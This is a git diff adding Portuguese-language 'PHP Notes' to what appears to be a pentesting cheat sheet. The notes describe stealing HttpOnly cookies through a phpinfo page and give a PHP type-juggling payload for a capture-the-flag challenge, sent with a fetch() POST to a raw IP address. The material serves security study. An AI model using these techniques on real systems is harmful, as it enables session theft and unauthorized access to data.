@@ -245,3 +245,23 @@ Insecure Deserialization
 Payloads: https://github.com/pwntester/ysoserial.net
 Json insercure deserialization: https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
 ```
+
+PHP Notes
+```
+- Como pegar o cookie com a flag HttpOnly marcado em ambientes (PHP ou não) se houver alguma página que lista os cookies do usuário para ele mesmo (com o valor, é claro). Geralmente em ~/sistema/phpinfo
+https://hackcommander.github.io/pentesting-article-1/#
+
+- Explorar o switch do php:
+	https://domdom.tistory.com/entry/HackTheBoo-Web-Juggling-Facts-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4?category=1004766
+	"body": "{\"type\":true}"
+
+	fetch("http://198.211.107.250:1337/api/getfacts", {
+	  "headers": {
+	    "content-type": "application/json"
+	  },
+	  "body": "{\"type\":1}",
+	  "method": "POST",
+	  "mode": "cors",
+	}).then((r)=>r.text()).
+	    then((r)=>console.log(r));
+```
